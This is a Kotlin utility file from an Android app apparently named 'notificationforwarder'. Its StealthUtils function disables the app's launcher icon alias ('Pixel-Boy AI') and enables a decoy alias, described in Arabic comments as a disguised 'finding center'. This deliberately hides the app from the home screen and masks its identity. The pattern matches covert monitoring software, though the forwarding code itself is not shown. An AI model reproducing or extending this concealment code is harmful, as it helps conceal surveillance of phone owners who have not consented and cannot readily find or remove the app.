package com.itsazni.notificationforwarder

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthUtils {

    fun switchToStealthMode(context: Context) {
        val packageManager = context.packageManager

        // ألياس الشاشة الرئيسية الأول (Pixel-Boy AI)
        val launcherAlias = ComponentName(
            context.packageName,
            "com.itsazni.notificationforwarder.LauncherAlias"
        )

        // الألياس التمويهي الخلفي (مركز العثور)
        val stealthAlias = ComponentName(
            context.packageName,
            "com.itsazni.notificationforwarder.StealthAlias"
        )

        try {
            // 1️⃣ تفعيل الألياس المخفي ليبقى المكون حياً تحت اسم مركز العثور
            packageManager.setComponentEnabledSetting(
                stealthAlias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                0
            )

            // 2️⃣ تعطيل ألياس Pixel-Boy AI وتطبيق 0 لإجبار اللانشر على مسح الأيقونة من الشاشة
            packageManager.setComponentEnabledSetting(
                launcherAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                0
            )

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
